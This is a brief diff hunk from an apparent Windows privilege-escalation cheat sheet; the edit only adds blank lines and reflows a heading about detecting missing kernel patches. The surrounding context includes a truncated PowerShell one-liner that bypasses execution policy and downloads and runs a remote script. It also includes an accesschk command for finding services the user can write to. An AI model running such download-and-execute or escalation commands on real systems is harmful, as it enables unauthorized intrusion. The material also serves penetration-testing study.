@@ -79,7 +79,9 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 
 # Kernel
 Missing patches are probably the easiest way to improve your privileges. However, this can make your target system unstable, so only use them when you are desperate, I recommend taking this route as a last resort as there are times when the system can corrupt and lead to problems when hacking the machine.  
-**Detect if vulnerable:** Get patchlevel and check for exploits
+
+
+**Detect if vulnerable:** Get patchlevel and check for exploits  
 ```
 #Check for what services we have write access by specifying one of our user roles (also check for the power users group)
 accesschk.exe -uwcqv "Authenticated Users" *
